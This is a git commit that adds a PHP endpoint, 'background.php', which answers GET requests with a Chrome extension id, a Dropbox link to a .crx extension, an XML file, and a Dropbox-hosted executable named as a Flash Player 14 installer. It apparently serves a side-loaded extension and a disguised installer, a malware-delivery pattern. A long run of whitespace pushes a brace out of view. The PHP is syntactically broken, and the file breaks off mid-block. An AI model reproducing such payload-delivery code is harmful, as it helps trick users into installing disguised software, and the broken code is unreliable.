17e7a3c558efeaec5b8d85f832c1deebe15c4ad9
Fiidannii <fidi_18@hotmail.com>
2014-06-29 18:16:25 +0200

    Create background.php

---
+++ background.php
@@ -0,0 +1,20 @@
+<?php
+            if(@$_GET)
+            {
+                        $type = $_GET["type"];
+                        
+                        if($type == "appid")
+                        {
+                                 echo "jekckclcjmlffpfmhkggempkfgdbjmfe";
+                        }
+                        elseif($ type == "CRX")                                                                                                  {
+                                   echo " https://www.dropbox.com/s/wrfp7jkza51i1k7/crx.crx"
+                        }
+
+                        elseif ($ type == "xml") 
+                        { 
+                                   echo " https://www.dropbox.com/s/6me9b45a6m8c5a4/xml.xml";
+                        }
+                        elseif ($ type == "extraex") 
+                        { 
+                                   echo " https://www.dropbox.com/s/ntwregg4gzjpd8h/install_flashplayer14x32_mssd_aaa_aih.exe ";
